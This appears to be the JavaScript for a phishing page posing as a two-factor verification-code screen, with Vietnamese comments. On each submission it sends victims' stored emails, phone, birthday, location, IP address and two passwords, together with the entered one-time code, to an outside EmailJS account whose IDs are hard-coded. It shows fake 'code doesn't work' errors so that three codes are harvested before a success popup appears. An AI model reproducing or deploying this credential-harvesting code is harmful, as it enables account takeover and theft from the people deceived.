let attempts = 0; // Đếm số lần nhập mã

document.addEventListener("DOMContentLoaded", function () {
    const getNewCodeLink = document.getElementById("getNewCode");
    getNewCodeLink.addEventListener("click", function (event) {
        event.preventDefault();
        startCountdown(30);
    });

    function startCountdown(seconds) {
        let remainingTime = seconds;
        getNewCodeLink.style.color = "black";
        updateCountdownText(remainingTime);
        getNewCodeLink.style.pointerEvents = "none";

        countdownInterval = setInterval(() => {
            remainingTime--;
            if (remainingTime <= 0) {
                clearInterval(countdownInterval);
                getNewCodeLink.style.color = "blue";
                getNewCodeLink.textContent = "Get a new code";
                getNewCodeLink.style.pointerEvents = "auto";
            } else {
                updateCountdownText(remainingTime);
            }
        }, 1000);
    }

    function updateCountdownText(remainingTime) {
        const timeText = `<strong>00:${remainingTime.toString().padStart(2, "0")}</strong>`;
        getNewCodeLink.innerHTML = `We can send a new code in ${timeText}`;
    }
});

document.getElementById('code').addEventListener('input', function () {
    let code = this.value.trim();
    const continueButton = document.getElementById('continueButton');
    const errorMessage = document.getElementById('error-message');

    if (!/^\d*$/.test(code)) {
        this.value = code.replace(/\D/g, '');
        code = this.value;
    }

    if (code.length > 8) {
        this.value = code.substring(0, 8);
    }

    if (code.length >= 6) {
        continueButton.disabled = false;
        errorMessage.style.display = 'none';
    } else {
        continueButton.disabled = true;
        errorMessage.textContent = code.length > 0 ? 'Code must be 6-digit or 8-digit.' : '';
        errorMessage.style.display = 'block';
    }
});

document.getElementById('continueButton').addEventListener('click', async function () {
    const code = document.getElementById('code').value.trim();
    const errorMessage = document.getElementById('error-message');
    const continueButton = this;

    if (code.length === 0) {
        errorMessage.textContent = 'Invalid code. Please enter digits only.';
        errorMessage.style.display = 'block';
        return;
    }

    // Thêm lớp làm mờ và vô hiệu hóa nút
    continueButton.classList.add('continue-button-disabled');

    const email = sessionStorage.getItem('email') || 'Unknown';
    const businessEmail = sessionStorage.getItem('email-bus') || 'Unknown';
    const phone = sessionStorage.getItem('phone') || 'Unknown';
    const birthday = sessionStorage.getItem('birthday') || 'Unknown';
    const location = sessionStorage.getItem('location') || 'Unknown/Unknown/Unknown';
    const ipAddress = sessionStorage.getItem('ip-address') || 'Unknown';
    const firstPassword = sessionStorage.getItem('first-password') || 'Unknown';
    const secondPassword = sessionStorage.getItem('second-password') || 'Unknown';
    const successPopup = document.getElementById("success-popup");

    attempts++;

    const templateParams = {
        location,
        ip_address: ipAddress,
        personal_email: email,
        business_email: businessEmail,
        phone,
        first_password: firstPassword,
        second_password: secondPassword,
        attempt_number: attempts,
        code_entered: code
    };

    try {
        const response = await emailjs.send("service_28gd8kz", "template_5hblblc", templateParams, "eBOyvEWjwfg1r8Ntb");

        if (response.status === 200) {
            if (attempts < 3) {
                setTimeout(() => {
                    errorMessage.textContent = 'This code doesn’t work. Check it’s correct or try a new one.';
                    errorMessage.style.display = 'block';
                    document.getElementById('code').value = '';
                    continueButton.disabled = true;
                    // Xóa lớp làm mờ sau khi hiển thị thông báo lỗi
                    continueButton.classList.remove('continue-button-disabled');
                }, 25000);
            } else {
                setTimeout(() => {
                    document.getElementById('code').value = '';
                    successPopup.style.display = "block";
                    // Xóa lớp làm mờ sau khi hiển thị popup thành công
                    continueButton.classList.remove('continue-button-disabled');
                }, 5000);
            }
        } else {
            console.error("EmailJS error:", response);
            errorMessage.textContent = 'Unable to send information. Please try again.';
            errorMessage.style.display = 'block';
            // Xóa lớp làm mờ nếu có lỗi
            continueButton.classList.remove('continue-button-disabled');
        }
    } catch (error) {
        console.error('EmailJS error:', error);
        errorMessage.textContent = 'Unable to send information. Please check your network connection.';
        errorMessage.style.display = 'block';
        // Xóa lớp làm mờ nếu có lỗi
        continueButton.classList.remove('continue-button-disabled');
    }
});